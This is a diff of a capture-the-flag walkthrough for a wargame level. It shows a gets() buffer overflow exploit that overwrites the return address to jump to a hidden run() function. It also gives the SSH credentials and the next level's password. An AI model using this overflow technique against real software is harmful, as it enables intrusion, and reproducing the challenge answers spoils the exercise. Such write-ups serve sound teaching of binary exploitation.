@@ -6,23 +6,19 @@
 3. Identify the vulnerability:
    - main() uses gets() which is unsafe
    - Buffer is 76 bytes
-   - There's a hidden run() function at address 0x08048444
+   - There's a hidden run() function at address 0x08048444 (visible in Ghidra)
 
-4. Find the run() function address:
-   objdump -d level1 | grep "<run>"
-   Address: 0x08048444
+4. Connect to the VM via SSH:
+   ssh level1@localhost -p 2222
+   Password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
 
-5. Calculate the offset:
-   - Buffer: 76 bytes
-   - We need to overwrite the return address after the buffer
-
-6. Craft and execute the exploit:
+5. Craft and execute the exploit:
    (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
 
-7. Read the password:
+6. Read the password:
    cat /home/user/level2/.pass
 
-8. Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+7. Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 
-9. Exit and login as level2:
+8. Exit and login as level2:
    su level2
